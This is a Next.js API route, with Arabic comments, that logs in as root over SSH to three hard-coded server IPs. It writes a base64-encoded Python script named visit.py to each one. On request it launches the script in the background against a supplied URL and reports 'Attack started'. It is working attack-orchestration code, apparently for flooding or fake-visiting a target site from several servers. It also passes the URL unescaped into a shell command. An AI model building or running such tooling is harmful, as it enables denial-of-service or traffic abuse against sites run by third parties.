import { NextResponse } from 'next/server';
import { Client } from 'ssh2';

// بيانات السيرفرات الثلاثة
const SERVERS = [
  { host: '138.68.153.135', username: 'root' },
  { host: '188.166.159.196', username: 'root' },
  { host: '46.101.78.167', username: 'root' }
];

// كود بايثون مشفر (Base64) لسهولة النقل
const PYTHON_SCRIPT_B64 = "";

async function executeOnServer(server, command) {
  return new Promise((resolve, reject) => {
    const conn = new Client();
    conn.on('ready', () => {
      conn.exec(command, (err, stream) => {
        if (err) {
          conn.end();
          return reject(err);
        }
        let output = '';
        stream.on('close', () => {
          conn.end();
          resolve(output);
        }).on('data', (data) => {
          output += data;
        }).stderr.on('data', (data) => {
          output += data;
        });
      });
    }).on('error', (err) => {
      reject(err);
    }).connect({
      host: server.host,
      port: 22,
      username: server.username,
      password: process.env.VPS_PASSWORD, // سيتم جلبه من المتغيرات البيئية
      readyTimeout: 20000,
    });
  });
}

export async function POST(req) {
  try {
    const { action, url } = await req.json();
    const results = [];

    for (const server of SERVERS) {
      try {
        let command = '';
        
        if (action === 'deploy') {
          // يفك تشفير الكود وينشئ ملف visit.py في السيرفر
          command = `echo "${PYTHON_SCRIPT_B64}" | base64 -d > /root/visit.py && echo "File created successfully"`;
        } else if (action === 'start') {
          if (!url) throw new Error("URL is required");
          // يشغل السكريبت في الخلفية (nohup)
          command = `nohup python3 /root/visit.py "${url}" > /dev/null 2>&1 & echo "Attack started on ${url}"`;
        } else if (action === 'stop') {
          // يوقف جميع عمليات بايثون المتعلقة بالسكريبت
          command = `pkill -f visit.py || echo "No process found"`;
        }

        const output = await executeOnServer(server, command);
        results.push({ host: server.host, status: 'success', output: output.trim() });
      } catch (error) {
        console.error(`Error on ${server.host}:`, error);
        results.push({ host: server.host, status: 'error', error: error.message });
      }
    }

    return NextResponse.json({ results });
  } catch (error) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
